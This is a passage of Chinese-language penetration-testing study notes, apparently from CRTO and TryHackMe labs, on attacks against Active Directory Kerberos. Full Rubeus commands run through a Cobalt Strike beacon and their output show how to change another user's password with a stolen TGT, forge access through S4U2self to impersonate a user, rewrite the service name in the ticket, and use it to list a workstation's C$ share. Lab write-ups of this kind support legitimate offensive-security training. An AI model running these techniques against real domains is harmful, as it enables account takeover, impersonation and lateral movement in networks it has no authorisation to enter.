...
这是thm[这个房间](https://tryhackme.com/room/adcertificatetemplates)里的例子，请求到一个管理员（或者任何有权限的用户）的tgt的时候，可以利用来修改其他用户的密码

```
beacon> execute-assembly tools/Rubeus2.1/Rubeus/bin/Debug/Rubeus.exe changepw /ticket:doIF9jCCBfKg....Y2EuY29t /new:Tryhackme! /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\da-nread
[*] Tasked beacon to run .NET program: Rubeus.exe changepw /ticket:doIF9jCCBfKg....Y2EuY29t /new:Tryhackme! /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\da-nread
[+] host called home, sent: 589531 bytes
[+] received output:
...
[+] received output:
[*] Using domain controller: LUNDC.lunar.eruca.com (10.10.171.139)
...
[*] base64(session subkey): SULMzCg2ex6YRsGEm37lQg==
...
**从这里开始使用S4U2self abuse技巧**，可以参考[S4U2self abuse](https://github.com/maxzxc0110/hack-study/blob/main/crto/lab/015-Kerberos.md)这一章



利用WKSTN-3的tgt，假冒nglover用户申请一张```cifs/wkstn-3.cyberbotic.io```的tgs

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /user:WKSTN-2$ /msdsspn:cifs/wkstn-3.cyberbotic.io /impersonateuser:nglover /ticket: /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe s4u /user:WKSTN-2$ /msdsspn:cifs/wkstn-3.cyberbotic.io /impersonateuser:nglover /ticket: /nowrap
[+] host called home, sent: 589307 bytes
[+] received output:
...
[*] Building S4U2self request for: 'WKSTN-3$@CYBERBOTIC.IO'
[*] Using domain controller: dc-1.cyberbotic.io (10.10.15.75)
[*] Sending S4U2self request to 10.10.15.75:88

[+] received output:
[+] S4U2self success!
[*] Got a TGS for 'nglover' to 'WKSTN-3$@CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      

[*] Impersonating user 'nglover' to target SPN 'cifs/wkstn-3.cyberbotic.io'
[*] Building S4U2proxy request for service: 'cifs/wkstn-3.cyberbotic.io'
[*] Using domain controller: dc-1.cyberbotic.io (10.10.15.75)
[*] Sending S4U2proxy request to domain controller 10.10.15.75:88
...
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661992621622.png)


可见s4u2proxy这一步失败了（KRB-ERROR (13) : KDC_ERR_BADOPTION），但是没有关系

制作一张wkstn-3-s4u.kirbi
```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\wkstn-3-s4u.kirbi", [System.Convert]::FromBase64String(""))
```


查看这张ticket的描述
```
PS C:\Tools\Rubeus\Rubeus\bin\Debug> .\Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-3-s4u.kirbi
...
[*] Action: Describe Ticket
  ...
  UserName                 :  nglover
  UserRealm                :  CYBERBOTIC.IO
  StartTime                :  9/1/2022 12:21:44 AM
  EndTime                  :  9/1/2022 10:15:43 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  vN+W29Kz1UGAurg+7UjiAs14Il3/42HJJrEcGUV9QLI=
[!] AES256 in use but no '/serviceuser' passed, unable to generate crackable hash.

PS C:\Tools\Rubeus\Rubeus\bin\Debug>
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661992677131.png)
...
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661992747939.png)

第二个修改的地方


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661992782518.png)
...
[*] Action: Describe Ticket
  ...
  ServiceName              :  cifs/wkstn-3.cyberbotic.io
  ServiceRealm             :  CYBERBOTIC.IO
  UserName                 :  nglover
  UserRealm                :  CYBERBOTIC.IO
  StartTime                :  9/1/2022 12:21:44 AM
...
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661992886154.png)

导入ticket，访问wkstn-3
```
beacon> make_token cyber\nglover fakepass
[*] Tasked beacon to create a token for cyber\nglover
[+] host called home, sent: 40 bytes
[+] Impersonated DEV\bfarmer
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\wkstn-3-s4u.kirbi
[*] Tasked beacon to apply ticket in C:\Users\Administrator\Desktop\wkstn-3-s4u.kirbi
[+] host called home, sent: 3042 bytes
beacon> ls \\wkstn-3.cyberbotic.io\c$
[*] Tasked beacon to list files in \\wkstn-3.cyberbotic.io\c$
[+] host called home, sent: 44 bytes
[*] Listing: \\wkstn-3.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/25/2022 11:54:07   $Recycle.Bin
          dir     02/10/2022 00:53:39   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     03/01/2022 16:53:03   Program Files
          dir     02/09/2022 23:27:57   Program Files (x86)
          dir     03/01/2022 16:56:20   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/28/2022 09:44:14   System Volume Information
          dir     03/01/2022 16:55:03   Users
          dir     03/01/2022 16:55:50   Windows
 381kb    fil     02/01/2022 04:27:04   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     08/31/2022 23:52:19   pagefile.sys
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661992957321.png)
